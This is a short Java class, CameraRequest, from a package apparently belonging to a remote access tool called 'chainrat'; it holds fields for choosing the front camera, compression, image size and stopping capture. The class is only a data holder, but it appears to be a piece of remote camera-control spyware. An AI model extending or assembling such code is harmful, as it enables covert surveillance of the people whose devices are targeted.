package com.nefi.chainrat.networking.packets;

public class CameraRequest {
    public boolean stop;
    public boolean useFront;
    public boolean useCompression;
    public int width;
    public int height;


    public CameraRequest(boolean useFront, boolean useCompression, int width, int height, boolean stop){
        this.useFront = useFront;
        this.useCompression = useCompression;
        this.width = width;
        this.height = height;
        this.stop = stop;
    }
}
